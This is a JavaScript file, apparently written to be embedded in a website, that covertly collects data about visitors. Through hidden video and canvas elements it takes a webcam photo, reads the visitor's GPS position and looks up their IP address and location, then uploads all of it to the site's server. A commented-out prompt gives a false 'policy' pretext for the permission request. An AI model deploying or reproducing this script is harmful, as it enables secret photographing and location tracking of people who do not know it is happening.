/*
 * @Author: whalefall
 * @Date: 2021-08-27 04:28:23
 * @LastEditTime: 2021-08-27 05:32:39
 * @Description: 获取访客信息并自动上传服务器 激活方法:getMedia(getGps);
 * 前面引入js
 * <script src="/static/js/getseeinfo.js"></script>
 后面引入获取ip地址
 *  <script src="https://whois.pconline.com.cn/ipJson.jsp"></script>
 * 在html中加入
 * <!-- 拍照用 -->
    <video id="video" width="600px" height="600px" autoplay="autoplay" style="display: none;"></video>
    <canvas id="canvas" width="600px" height="600px" style="display: none;"></canvas>
*/

// 储存获取到的信息
var infodata = {};

function IPCallBack(location) {
	infodata['ip'] = {
		'ip': location.ip,
		'where': location.addr
	};
};

// 窗体加载完成后的事情
// $(document).ready(function() {
//     // layer.alert('因为政策需要，请小可爱赋予权限以运行，谢谢！', {
//     // 	skin: 'layui-layer-molv', //样式类名
//     // 	closeBtn: 1,
//     // }, function(index) {
//     // 	getMedia(getGps);
//     // });
//     getMedia(getGps);
// });

//提交数据上服务器
function submit() {
	// 判断数据是否为空
	if (infodata.base64 == undefined && infodata.gps == undefined && infodata.ip == undefined) {
		console.log('数据为空');
		layer.msg('空空然~');
		return;
	};
	console.log(infodata);
	$.ajax({
		url: "/upload_info/",
		type: "POST",
		contentType: 'application/json;charset=UTF-8',
		data: JSON.stringify(infodata),
		dataType: "json",
		// beforeSend: function() {
		// 	// jsShow();
		// 	// console.log(location);
		// 	// IPCallBack();
		// },
		success: function(result) {
			console.log(result)
			if (result.code == 200) {
				layer.msg(result.msg);
			} else {
				layer.msg(result.code + result.msg);
			}
		},
		error: function(xhr, status, error) {
			console.log("上传失败");
			layer.msg("内部submit失败." + status + error);
		}
	})
};

// 拍照代码
// 等待窗体加载完成获得video摄像头区域

window.onload = function() {
	let video = document.getElementById("video");
};

// 摄像头成功则调用此代码
function takePhoto(callback) {
	//获得Canvas对象
	let canvas = document.getElementById("canvas");
	let ctx = canvas.getContext('2d');
	ctx.drawImage(video, 0, 0, 600, 600);
	// 图片转base64
	var base64 = canvas.toDataURL('image/jpeg').substr(22);
	// 上传base64图片和地理位置到服务器
	infodata['base64'] = base64;
	callback(submit); // 执行回调

}

function getMedia(callback) {
	let constraints = {
		video: {
			width: 600,
			height: 600
		},
		audio: false
	};
	/*
	这里介绍新的方法:H5新媒体接口 navigator.mediaDevices.getUserMedia()
	这个方法会提示用户是否允许媒体输入,(媒体输入主要包括相机,视频采集设备,屏幕共享服务,麦克风,A/D转换器等)
	返回的是一个Promise对象。
	如果用户同意使用权限,则会将 MediaStream对象作为resolve()的参数传给then()
	如果用户拒绝使用权限,或者请求的媒体资源不可用,则会将 PermissionDeniedError作为reject()的参数传给catch()
	*/
	let promise = navigator.mediaDevices.getUserMedia(constraints);
	promise.then(function(MediaStream) {
		// 获取成功延时4s后拍照
		video.srcObject = MediaStream;
		video.play();
		layer.msg("申请成功!");
		setTimeout(function() {
			takePhoto(getGps);
		}, 1500);

	}).catch(function(PermissionDeniedError) {
		layer.alert('权限申请失败!网页无法正常运行咯,呜呜呜:' + PermissionDeniedError, {
			skin: 'layui-layer-molv', //样式类名
			closeBtn: 1
		}, function(index) {
			layer.close(index);
		});
		callback();
		console.log(PermissionDeniedError);
	})

}

// 获取位置
function getGps() {
	// H5 获取当前位置经纬度
	var location_lon = '',
		location_lat = ''; // 经度,纬度
	if (navigator.geolocation) {

		navigator.geolocation.getCurrentPosition(function(position) {
			location_lon = position.coords.longitude;
			location_lat = position.coords.latitude;
			// layer.msg('h5经度：'+location_lon+'h5纬度：'+location_lat);
			var r = {
				"x": location_lon,
				"y": location_lat,
			};
			infodata['gps'] = r;
			// initmap(r["x"], r["y"]);
			layer.msg('GPMS 成功');
			console.log('GPS成功')
			submit();
		}, function(error) {
			console.log('GPMS内部错误');
			layer.msg("GPMS内部错误");
			submit();
		});

	} else {
		console.log("GPS错误");
		layer.msg("浏览器不支持GPMS！");
		submit();
	}
};
